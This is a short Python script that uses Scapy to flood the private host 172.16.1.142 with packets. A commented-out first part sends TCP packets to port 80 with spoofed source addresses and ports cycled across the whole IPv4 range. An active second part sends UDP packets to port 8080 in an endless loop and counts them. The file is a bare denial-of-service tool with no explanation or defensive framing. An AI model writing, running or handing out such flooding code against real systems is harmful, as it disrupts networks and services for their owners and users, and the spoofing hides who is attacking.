# from scapy.all import *

# def tcpconn(packet):
#     sendp(packet)

# eth=Ether()
# ip=IP()
# ip.dst="172.16.1.142"
# tcp=TCP()
# tcp.dport=80
# m=0
# for i in range(0,256):
#     for j in range(0,256):
#         for k in range(0,256):
#             for n in range(0,256):
#                 for sp in range(0,65536):
#                     ip.src=str(i)+'.'+str(j)+'.'+str(k)+'.'+str(n)
#                     tcp.sport=sp
#                     packet=eth/ip/tcp
#                     tcpconn(packet)
#                     print("sending packet to %s"%ip.dst+" Port Is %s"%tcp.dport)
#                     m=m+1
#                     print(m)





















from scapy.all import *
def udpconn(packet):
    sendp(packet)
eth=Ether()
ip=IP()
ip.dst="172.16.1.142"
udp=UDP()
udp.dport=8080

m=0 
while True:
    packet=eth/ip/udp
    udpconn(packet)
    print("sending packet to %s"%ip.dst+"Port Is %s"%udp.dport)
    m=m+1
    print(m)

